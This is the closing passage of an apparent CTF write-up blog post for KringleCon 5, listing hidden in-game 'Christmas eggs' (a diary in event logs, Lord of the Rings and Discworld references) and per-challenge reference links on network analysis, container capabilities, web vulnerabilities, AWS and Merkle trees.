    <img data-src="/images/kringlecon5/lootboxes/loot6.webp" alt="loot box 6" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure></td>
</tr>
</tbody>
</table>
<h2 id="christmas-eggs">Christmas Eggs</h2>
<p>This year theme is clearly The Lord of the Rings. Therefore, we will keep aside all the references to it, unless they are really well hidden.</p>
<table>
<thead>
<tr>
<th>Location</th>
<th>Egg</th>
</tr>
</thead>
<tbody>
<tr>
<td>Wireshark Practice</td>
<td>The initial phishing email <code>phish.odt</code> can be found in <code>/opt</code>.<figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg01.webp" alt="egg01" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>Windows Event Logs</td>
<td>We can find the content of the file <code>mydiary.txt</code> written by an elf in the logs:<br /><br />Oct 31 2022<br />Halloween is the worst holiday ever. Everything is so spooky! And some elves get way too into it, especially Smilegol this year. It&rsquo;s very unlike him. He&rsquo;s been acting kind of strange…<br />P.S.<br />Don&rsquo;t tell anybody, but I do like all the tasty candy we get. So I guess Halloween isn&rsquo;t all that bad.<br /><br />Nov 25 2022<br />I love Thanksgiving because it means Christmas is almost here! That&rsquo;s what I&rsquo;m thankful for this year&hellip; and every year. Smilegol was such a glutton at Thanksgiving dinner. He kept sticking his hand in everyone&rsquo;s food and yelling &lsquo;MY GERMS!&rsquo; and then coughing onto it with that yucky cough he has now. He&rsquo;s like a whole different elf lately. Everyone is really starting to become worried about him.<br /><br />Dec 18 2022<br />Lembanh! Santa wants us to try making some this year. We searched everywhere for this recipe that&rsquo;s supposed to have the secret ingredient to really make it authentic. It&rsquo;s gonna be delicious, I&rsquo;m so excited!</td>
</tr>
<tr>
<td>Jolly CI/CD</td>
<td>The ecommerce sells the following flags and banners of the many noble houses found in the land of the North:<figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg02.webp" alt="egg02" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
</figure><figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg03.webp" alt="egg03" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
</figure><figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg04.webp" alt="egg04" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
</figure><figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg05.webp" alt="egg05" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
</figure><figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg06.webp" alt="egg06" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>Glamtariel&rsquo;s Fountain</td>
<td>When we ask Glamtariel for the <code>greenring.txt</code> file, we get the answer: &ldquo;Hey, who is this guy? He doesn&rsquo;t have a ticket!^I don&rsquo;t remember seeing him in the movies!&rdquo; with this image:<figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg07.webp" alt="egg07" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='50%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:50%;height:;"/>
  

  
  
</figure>It refers to <a href="https://en.wikipedia.org/wiki/Tom_Bombadil">Tom Bombadil</a>, a <em>Lord of the Rings</em> characters that appears in the books but not in the movies.</td>
</tr>
<tr>
<td>Burning Ring of Fire</td>
<td>Jason is back: <figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg08.webp" alt="egg08" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='50%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:50%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>Underground</td>
<td>A hidden message in the tunnel map: <figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg09.webp" alt="egg09" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='70%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:70%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>Shenanigans</td>
<td>Like last year, the Shenanigans room is there and its entrance is hidden behind the castle. The turtle background is still there as well. The image represents Great A’Tuin, the Giant Star Turtle who travels through the Discworld universe’s space.<figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg10.webp" alt="egg10" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='60%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:60%;height:;"/>
  

  
  
</figure>But there is something new there this year. The <em>Santa Magic</em> terminal that allows users to retrieve the secret key of their wallet: <figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg11.webp" alt="egg11" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='50%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:50%;height:;"/>
  

  
  
</figure>During the convo with <em>Santa</em>, he refers to some characters like Yukon Cornelius, Dolly, Burgermeister Meisterburger and the island of Misfit Toys.</td>
</tr>
<tr>
<td>Castle Entry</td>
<td>The 4 birds of KringleCon 4: <figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg12.webp" alt="egg12" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
</figure></td>
</tr>
<tr>
<td>Loot Box 5</td>
<td><a href="https://knowyourmeme.com/memes/dimitri-finds-out">Dimitri</a> hat:<figure >
  
  
  
    <img data-src="/images/kringlecon5/eggs/egg13.webp" alt="egg13" data-caption="" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
</figure></td>
</tr>
</tbody>
</table>
<h2 id="resources">Resources</h2>
<h5 id="recover-the-tolkien-ring">Recover the Tolkien Ring</h5>
<ul>
<li><a href="https://youtu.be/5NZeHYPMXAE">https://youtu.be/5NZeHYPMXAE</a></li>
<li><a href="https://protocoholic.com/2018/05/24/wireshark-how-to-identify-top-talkers-in-network/">https://protocoholic.com/2018/05/24/wireshark-how-to-identify-top-talkers-in-network/</a></li>
<li><a href="https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html">https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html</a></li>
<li><a href="https://github.com/pan-unit42/wireshark-tutorial-Dridex-traffic">https://github.com/pan-unit42/wireshark-tutorial-Dridex-traffic</a></li>
<li><a href="https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/">https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/</a></li>
<li><a href="https://github.com/omerbenamram/evtx/">https://github.com/omerbenamram/evtx/</a></li>
</ul>
<h5 id="recover-the-elfen-ring">Recover the Elfen Ring</h5>
<ul>
<li><a href="https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/">https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/</a></li>
<li><a href="https://github.com/git-guides/git-clone">https://github.com/git-guides/git-clone</a></li>
<li><a href="https://tbhaxor.com/understanding-linux-capabilities/">https://tbhaxor.com/understanding-linux-capabilities/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a></li>
</ul>
<h5 id="recover-the-web-ring">Recover the Web Ring</h5>
<ul>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</a></li>
<li><a href="https://content-security-policy.com/">https://content-security-policy.com/</a></li>
<li><a href="https://www.wireshark.org/docs/wsug_html_chunked/ChWorkFindPacketSection.html">https://www.wireshark.org/docs/wsug_html_chunked/ChWorkFindPacketSection.html</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>
<li><a href="https://owasp.org/www-community/attacks/Brute_force_attack">https://owasp.org/www-community/attacks/Brute_force_attack</a></li>
<li><a href="https://owasp.org/www-community/attacks/Forced_browsing">https://owasp.org/www-community/attacks/Forced_browsing</a></li>
</ul>
<h5 id="recover-the-cloud-ring">Recover the Cloud Ring</h5>
<ul>
<li><a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/get-caller-identity.html">https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/get-caller-identity.html</a></li>
<li><a href="https://youtu.be/t-xDvVUialo">https://youtu.be/t-xDvVUialo</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html">https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html</a></li>
<li><a href="https://www.sans.org/blog/cloud-instance-metadata-services-imds-/">https://www.sans.org/blog/cloud-instance-metadata-services-imds-/</a></li>
</ul>
<h5 id="recover-the-burning-ring-of-fire">Recover the Burning Ring of Fire</h5>
<ul>
<li><a href="https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/">https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/</a></li>
<li><a href="https://youtu.be/Qt_RWBq63S8">https://youtu.be/Qt_RWBq63S8</a></li>
<li><a href="https://github.com/QPetabyte/Merkle_Trees">https://github.com/QPetabyte/Merkle_Trees</a></li>
<li><a href="https://youtu.be/r3zj9DPC8VY">https://youtu.be/r3zj9DPC8VY</a></li>
</ul>

    </article>
    
    
<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>
<script>
  'use strict';
  document.addEventListener('DOMContentLoaded', function () {
    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
          text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    
  });
</script>
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  

  

  
  var dollarCodeElem = document.querySelectorAll('div.language-\\$');
  var gtCodeElem = document.querySelectorAll('div.language-\\>');

  dollarCodeElem ?
  dollarCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '$<br/>';
    }) : null;
  }) : null;

  gtCodeElem ?
  gtCodeElem.forEach(function(elem) {
    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
    lnts ? 
    lnts.forEach(function(lnt) {
      lnt.innerHTML = '><br/>';
    }) : null;
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://twitter.com/intent/tweet?text=KringleCon%205%3a%20Golden%20Rings&url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon5%2f&hashtags=kringlecon%2cholidayhack&via=noobintheshell_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
      
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon5%2f&title=KringleCon%205%3a%20Golden%20Rings &summary=This%20year%20challenges%20were%20covering%20logs%20and%20PCAP%20analysis%2c%20CI%2fCD%20vulnerabilities%2c%20a%20container%20escape%2c%20webapp%20hacking%20%28XXE%2c%20CSP%20bypass%29%2c%20an%20introduction%20to%20AWS%20CLI%20for%20cloud%20discovery%20and%20an%20introduction%20to%20smart%20contracts.&source=Cybersecurity%20blog%20and%20CTF%20write-ups" target="_blank" rel="noreferrer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
          <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
        </a>
      
    
      
        <a href="https://www.reddit.com/submit?url=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon5%2f&amp;title=KringleCon%205%3a%20Golden%20Rings" target="_blank" rel="noreferrer" title="Reddit" aria-label="Reddit Share Button" onclick="window.open('http://www.reddit.com/submit?url=' + encodeURIComponent(document.URL) + '&amp;title=' +  encodeURIComponent(document.title)); return false;" class="donation__item" data-type="share">
          <svg data-name="reddit" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.325 9.308c-.758 0-1.425.319-1.916.816-1.805-1.268-4.239-2.084-6.936-2.171l1.401-6.406 4.461 1.016c0 1.108.89 2.013 1.982 2.013 1.113 0 2.008-.929 2.008-2.038s-.889-2.038-2.007-2.038c-.779 0-1.451.477-1.786 1.129l-4.927-1.108c-.248-.067-.491.113-.557.365l-1.538 7.062c-2.676.113-5.084.928-6.895 2.197-.491-.518-1.184-.837-1.942-.837-2.812 0-3.733 3.829-1.158 5.138-.091.405-.132.837-.132 1.268 0 4.301 4.775 7.786 10.638 7.786 5.888 0 10.663-3.485 10.663-7.786 0-.431-.045-.883-.156-1.289 2.523-1.314 1.594-5.115-1.203-5.117zm-15.724 5.41c0-1.129.89-2.038 2.008-2.038 1.092 0 1.983.903 1.983 2.038 0 1.109-.89 2.013-1.983 2.013-1.113.005-2.008-.904-2.008-2.013zm10.839 4.798c-1.841 1.868-7.036 1.868-8.878 0-.203-.18-.203-.498 0-.703.177-.18.491-.18.668 0 1.406 1.463 6.07 1.488 7.537 0 .177-.18.491-.18.668 0 .207.206.207.524.005.703zm-.041-2.781c-1.092 0-1.982-.903-1.982-2.011 0-1.129.89-2.038 1.982-2.038 1.113 0 2.008.903 2.008 2.038-.005 1.103-.895 2.011-2.008 2.011z"/></svg>
        </a>
      
    
      
